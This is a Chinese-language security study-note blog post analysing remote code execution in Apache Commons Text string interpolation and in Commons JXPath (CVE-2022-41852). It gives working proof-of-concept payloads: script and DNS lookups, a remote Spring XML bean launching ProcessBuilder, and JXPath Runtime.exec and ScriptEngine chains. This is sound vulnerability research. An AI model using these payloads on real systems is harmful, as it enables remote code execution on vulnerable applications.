---
title: "Java学习笔记Ⅺ"
slug: "java-study-notes-11"
description: "鉴定网络热门Java CVE | 长期更新"
date: 2022-10-13T23:38:14+08:00
categories: ["NOTES&SUMMARY", "LTS"]
series: ["Java学习笔记"]
tags: ["Java"]
draft: false
toc: true
---

## apache commons text

> apache commons text<1.10.0

在2022.9.24官方更新了1.10.0，虽然[release history](https://commons.apache.org/proper/commons-text/changes-report.html#a1.10.0)中没有提到漏洞，仔细看还是有点东西

![image-20221013191723800](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221013191723800.png)

也就是说在先前的版本中，`StringSubstitutor.createInterpolator()`可能存在lookup相关的问题，看看官方[doc: StringSubstitutor](https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/StringSubstitutor.html)  |  [doc: StringLookupFactory](https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/lookup/StringLookupFactory.html)

![image-20221013193942819](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221013193942819.png)

![image-20221013194321115](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221013194321115.png)

更新公告中将[dns](https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/lookup/StringLookupFactory.html#dnsStringLookup--)和[script](https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/lookup/StringLookupFactory.html#scriptStringLookup--)都移出了默认的Lookups，手搓一个poc

```java
public class cText {
    public static void main(String[] args) {
        String payload1 = StringSubstitutor.createInterpolator().replace("${dns:address|cText.30nux0.ceye.io}");
        String payload2 = StringSubstitutor.createInterpolator().replace("${script:js:new java.lang.ProcessBuilder(\"calc.exe\").start()}");
    }
}
```

![image-20221013213632623](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221013213632623.png)

~~这未免也太逊了8~~打个断点看看内部实现

先看能rce的，调用栈如下

```
lookup:70, ScriptStringLookup (org.apache.commons.text.lookup)
lookup:135, InterpolatorStringLookup (org.apache.commons.text.lookup)
resolveVariable:1067, StringSubstitutor (org.apache.commons.text)
substitute:1433, StringSubstitutor (org.apache.commons.text)
substitute:1308, StringSubstitutor (org.apache.commons.text)
replace:816, StringSubstitutor (org.apache.commons.text)
main:7, cText (test1)
```

![image-20221013215231838](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221013215231838.png)

dns的那个同理，不再赘述

## CVE-2022-41852

> Commons JXPath<=1.3

参考：[浅析Apache Commons Jxpath命令执行分析(CVE-2022-41852)](https://tttang.com/archive/1771/)

JXPath支持标准的XPath，同时有很多附加功能，feature之一是[动态执行代码](https://commons.apache.org/proper/commons-jxpath/users-guide.html#Standard_Extension_Functions)

![image-20221017220404981](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017220404981.png)

……这还能咋说，令人无语，本质和上面的commons text、log4j一样，都是设计了很多完全无用或者过度注重扩展性的功能，导致漏洞四处漏风；测试demo

![image-20221017221014855](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017221014855.png)

打断点看看这个"feature"是怎么实现的；中间调用不是很多，捡重点看

```
getFunction:197, PackageFunctions (org.apache.commons.jxpath)
getFunction:753, JXPathContextReferenceImpl (org.apache.commons.jxpath.ri)
getFunction:140, RootContext (org.apache.commons.jxpath.ri.axes)
computeValue:96, ExtensionFunction (org.apache.commons.jxpath.ri.compiler)
getValue:353, JXPathContextReferenceImpl (org.apache.commons.jxpath.ri)
getValue:313, JXPathContextReferenceImpl (org.apache.commons.jxpath.ri)
main:9, test (test1)
```

![image-20221017221944986](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017221944986.png)

注意这里处理methodName时支持两种调用方式，实例化构造函数ConstructFunction(constructor)和静态方法反射调用MethodFunction(method)，我们这里的demo是第二种方式，那还有没有更多的利用方式？

- 针对构造函数：

org.springframework.context.support.FileSystemXmlApplicationContext.new(http://127.0.0.1/a.xml)

```xml
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation=" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
<bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
<constructor-arg>
<list>
<value>calc.exe</value>
</list>
</constructor-arg>
</bean>
</beans>
```

- 针对静态方法

javax.naming.InitialContext.doLookup，jndi调用

jdbc利用

以上几种方式都有应用场景的局限，有没有什么仅用JXPath就可以的呢？官方doc中第三个demo给出了

```java
String firstName = (String)context.getValue("getAuthorsFirstName($book)");
// As you can see, the target of the method is specified as the first parameter of the function.
```

也就意味着我们可以这样在JXPath中链式调用函数进行rce，无需其它依赖

```java
String firstName = (String)context.getValue("exec(java.lang.Runtime.getRuntime(),'calc.exe')");
String firstName = (String)context.getValue("eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),'java.lang.Runtime.getRuntime().exec(\"calc.exe\")')");
```

帅！